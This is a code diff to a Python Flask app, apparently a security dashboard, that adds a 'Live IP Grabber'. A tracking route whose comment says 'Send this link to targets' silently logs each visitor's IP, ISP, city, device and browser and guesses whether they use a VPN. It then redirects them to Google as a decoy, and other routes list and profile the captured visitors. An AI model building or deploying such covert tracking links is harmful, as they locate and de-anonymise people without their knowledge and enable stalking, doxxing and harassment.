@@ -104,6 +104,19 @@ def init_db():
             location TEXT, 
             created_at TIMESTAMP)''')
         
+        # New Traffic Logs Table for IP Grabber
+        db.execute('''CREATE TABLE IF NOT EXISTS traffic_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip_address TEXT,
+            provider TEXT,
+            country TEXT,
+            state TEXT,
+            city TEXT,
+            user_agent TEXT,
+            referring_url TEXT,
+            is_vpn BOOLEAN,
+            timestamp TIMESTAMP)''')
+        
         cur = db.execute("SELECT * FROM emergency_keys")
         if not cur.fetchone():
             db.execute("INSERT INTO emergency_keys (org_name, current_key, requested_at) VALUES (?, ?, ?)", ('Global_Org', generate_emergency_key(), get_live_time()))
@@ -396,6 +409,106 @@ def ueba_data():
         risks.append({"user": row['user'], "risk_score": 95, "event": "Multiple Failed/Blocked Actions", "details": f"IP: {row['ip_address']}", "action": "Flagged for Review"})
     if not risks: risks = [{"user": "System Normal", "risk_score": 0, "event": "No anomalies", "details": "All user behavior within thresholds.", "action": "None"}]
     return jsonify(risks)
+
+# --- LIVE IP GRABBER & TRAFFIC ANALYTICS ---
+
+@app.route('/t/<track_id>', methods=['GET'])
+def track_visitor(track_id):
+    # Live IP Grabber Endpoint. Send this link to targets.
+    ip = get_client_ip()
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    referrer = request.headers.get('Referer', 'no referrer')
+    
+    # Live Lookup using IP-API with extended fields (proxy/vpn detection requires pro for ip-api, 
+    # but we will use the standard fields and check hosting/mobile to infer)
+    # Fields: status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,query
+    # Since free ip-api doesn't do proxy reliably without a key, we infer from 'hosting'.
+    country, state, city, provider = "Unknown", "Unknown", "Unknown", "Unknown"
+    is_vpn = False
+    
+    if ip != '127.0.0.1' and not ip.startswith('192.168.'):
+        try:
+            res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,mobile,proxy,hosting,query", timeout=3).json()
+            if res.get("status") == "success":
+                country = res.get("country", "Unknown")
+                state = res.get("regionName", "Unknown")
+                city = res.get("city", "Unknown")
+                provider = res.get("isp", "Unknown")
+                if not provider: provider = res.get("org", "Unknown")
+                
+                # If it's a hosting center (AWS, DigitalOcean) or flagged as proxy, likely a VPN
+                if res.get("hosting", False) or res.get("proxy", False):
+                    is_vpn = True
+        except: pass
+
+    db = get_db()
+    db.execute('INSERT INTO traffic_logs (ip_address, provider, country, state, city, user_agent, referring_url, is_vpn, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
+               (ip, provider, country, state, city, user_agent, referrer, is_vpn, get_live_time()))
+    db.commit()
+    
+    # Redirect target to a safe decoy page
+    return redirect("https://www.google.com")
+
+@app.route('/api/analytics/traffic', methods=['GET'])
+def get_traffic_logs():
+    if 'logged_in' not in session: return jsonify({'error': 'Unauthorized'}), 401
+    db = get_db()
+    cur = db.execute("SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT 100")
+    logs = [dict(row) for row in cur.fetchall()]
+    return jsonify(logs)
+
+@app.route('/api/explain_log', methods=['POST'])
+def explain_log():
+    if 'logged_in' not in session: return jsonify({'error': 'Unauthorized'}), 401
+    
+    data = request.json
+    ip = data.get('ip', '')
+    provider = data.get('provider', '')
+    country = data.get('country', '')
+    state = data.get('state', '')
+    ua = data.get('user_agent', '').lower()
+    is_vpn = data.get('is_vpn', False)
+    
+    # Build deterministic narrative based on LIVE data
+    narrative = []
+    
+    # Location & Provider Analysis
+    loc_str = "an unknown location"
+    if country != "Unknown":
+        loc_str = f"the {country}"
+        if state != "Unknown": loc_str += f", specifically the {state} area"
+    
+    isp_str = "an unknown provider"
+    network_type = "standard residential"
+    if provider != "Unknown":
+        isp_str = f"{provider}"
+        if is_vpn: network_type = "data center or hosting provider"
+    
+    narrative.append(f"The user appears to be accessing the internet from {loc_str}, using an IP associated with {isp_str}. The connection suggests a {network_type} network route.")
+    
+    # Device & Browser Analysis
+    os_name = "an unknown operating system"
+    if "windows" in ua: os_name = "Windows"
+    elif "mac os" in ua or "macintosh" in ua: os_name = "macOS"
+    elif "android" in ua: os_name = "Android"
+    elif "iphone" in ua or "ipad" in ua: os_name = "iOS"
+    elif "linux" in ua: os_name = "Linux"
+    
+    browser = "an unknown browser"
+    if "chrome" in ua and "edg" not in ua: browser = "Google Chrome"
+    elif "firefox" in ua: browser = "Mozilla Firefox"
+    elif "safari" in ua and "chrome" not in ua: browser = "Apple Safari"
+    elif "edg" in ua: browser = "Microsoft Edge"
+    
+    narrative.append(f"The user is running {os_name} and using {browser}. This combination indicates a typical user setup for this platform.")
+    
+    # VPN / Privacy Analysis
+    if is_vpn:
+        narrative.append("The user's IP is flagged as a potential VPN, Proxy, or Datacenter IP, implying an effort to obscure or alter their apparent location. This behavior is often associated with privacy preferences or bypassing restrictions.")
+    else:
+        narrative.append("There is no immediate indication of network-level masking (VPN/Proxy). The IP aligns with standard ISP behavior.")
+    
+    return jsonify({"explanation": "\n\n".join(narrative)})
 
 if __name__ == '__main__':
     app.run(debug=False, port=5000, threaded=True)
